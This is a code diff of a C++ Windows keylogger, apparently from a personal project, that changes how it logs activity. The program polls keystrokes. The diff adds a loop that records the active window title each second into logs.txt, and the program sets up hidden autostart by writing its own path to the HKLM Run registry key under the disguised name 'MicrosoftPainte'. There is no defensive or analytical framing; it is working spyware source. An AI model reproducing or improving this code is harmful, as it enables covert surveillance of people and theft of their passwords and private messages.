@@ -2,30 +2,13 @@
 #include <iostream>
 #include <Windows.h>
 #include <string>
-#include <atlstr.h>
 #include <time.h>
+#include <fstream>
 #include <chrono>
 #include <thread>
 using namespace std;
 char iss[200];
 HWND console = GetConsoleWindow();
-// Show the user change window
-void Window(void)
-{
-	this_thread::sleep_for(chrono::seconds(1));
-	time_t theTime = time(NULL);
-	struct tm* aTime = localtime(&theTime);
-	int day = aTime->tm_mday;
-	int month = aTime->tm_mon + 1;
-	int year = aTime->tm_year + 1900;
-	int hour = aTime->tm_hour;
-	int minute = aTime->tm_min;
-	int seconds = aTime->tm_sec;
-
-	HWND app = GetForegroundWindow();
-	GetWindowTextA(app, iss, 200);
-	cout << "[" << hour << ":" << minute << ":" << seconds << "]" << " " << iss << "\n";
-}
 // Log all keys delai => allows you to reduce or increase the delay between each check
 void Keylogger(int delai) {
 		if (GetKeyState('A') & 0x8000) {
@@ -297,7 +280,7 @@ int main()
 
 	
 	system("title Keylogger");
-	string path;
+	string pap;
 
 	HMODULE hModule = NULL;
 	char Path[MAX_PATH];
@@ -307,11 +290,11 @@ int main()
 		(sizeof(Path))
 
 	);
-	path = Path;
+	pap = Path;
 	HKEY key = NULL;
 	LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE | KEY_READ, &key);
 	if (res == ERROR_SUCCESS) {
-		res = RegSetValueEx(key, TEXT("MicrosoftPainte"), 0, REG_SZ, (BYTE *)path.c_str(), (path.size()+1) * sizeof(wchar_t));
+		res = RegSetValueEx(key, TEXT("MicrosoftPainte"), 0, REG_SZ, (BYTE *)pap.c_str(), (pap.size()+1) * sizeof(wchar_t));
 		if (res == ERROR_SUCCESS) {
 			cout << "Sucess! \n";
 		}
@@ -322,12 +305,28 @@ int main()
 	else {
 		cout << "Pas bon \n";
 	}
+	
 
+	string oldwindow;
+	string filename = "logs.txt";
+	std::ofstream o(filename.c_str());
 
 	while (true)
 	{
-
-	
 		
+		this_thread::sleep_for(chrono::seconds(1));
+		HWND app = GetForegroundWindow();
+		GetWindowTextA(app, iss, 200);
+		time_t theTime = time(NULL);
+		struct tm* aTime = localtime(&theTime);
+		int day = aTime->tm_mday;
+		int month = aTime->tm_mon + 1;
+		int year = aTime->tm_year + 1900;
+		int hour = aTime->tm_hour;
+		int minute = aTime->tm_min;
+		int seconds = aTime->tm_sec;
+		cout << "[" << hour << ":" << minute << ":" << seconds << "]" << " " << iss << "\n";
+		o << iss << endl;
+	
 	}
 }
